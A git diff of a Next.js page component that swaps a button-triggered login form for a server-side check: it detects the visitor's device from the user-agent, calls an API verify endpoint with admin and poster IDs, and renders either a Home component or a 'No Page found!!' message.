@@ -1,29 +1,47 @@
-"use client";
-import LoginForm from "@/app/components/LoginForm";
-import { useState } from "react";
 
-export default function Home({ params,req }) {
-  const [homepage, setHomepage] = useState(false);
+import Home from "@/app/components/Home";
+import { site,API_URL } from "../../../config/index";
+import { headers } from 'next/headers'
+
+export default async function page({params}) {
   const { adminId, posterId } = params;
-  console.log(req)
-  return (
-    <>
-      {!homepage ? (
-        <div className="">
-          <img src="/images/main.jpeg" />
-          <button
-            className="w-3/4 flex  flex-col justify-center items-center mx-auto text-[#ffff] mt -3 px-3 py-2 rounded bg-[#00aaff]"
-            onClick={() => setHomepage(true)}
-          >
-            Post list Check
-          </button>
-        </div>
-      ) : (
-        <LoginForm adminId={adminId} posterId={posterId} />
-      )}
-    </>
+  const headersList = headers()
+  let content;
+  const userAgent = headersList.get("user-agent")
+  console.log(userAgent)
+  const isMobileView = userAgent.match(
+    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
   );
+
+  const isTabletView = userAgent.match(
+    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
+  );
+
+  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";
+
+  const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;
+
+  const res = await fetch(url);
+  const data = await res.json();
+  console.log(data)
+  if (data?.success !== "exists") {
+    
+      content= <div className="col-span-12">No Page found!!</div>
+    
+  }
+  if (data?.success == "exists") {
+    // content= <div className="col-span-12">Page found!!</div>
+    
+      content= <Home adminId={adminId} posterId={posterId }/>
+    
+  }
+  return (
+    <div>
+     {content}
+    </div>
+  )
 }
+
 
 
 
